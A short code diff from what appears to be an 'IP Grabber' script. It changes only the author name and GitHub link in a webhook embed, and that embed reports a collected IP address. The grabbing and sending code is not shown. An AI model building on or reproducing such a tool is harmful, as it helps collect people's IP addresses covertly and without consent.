@@ -25,12 +25,12 @@ headers = {
 
 
 embed = {
-        "username": "IP Grabber by sp33k ",
+        "username": "IP Grabber by tactic4ll ",
         "avatar_url": "https://zupimages.net/viewer.php?id=21/23/qqh5.gif",
         "embeds": [
     {
       "title": "My Github",
-      "url": "https://github.com/Sp33k",
+      "url": "https://github.com/tactic4ll",
       "color": 0x0c0303,
       "fields": [
         {"name": "IP :", "value": info[liste[0]]},
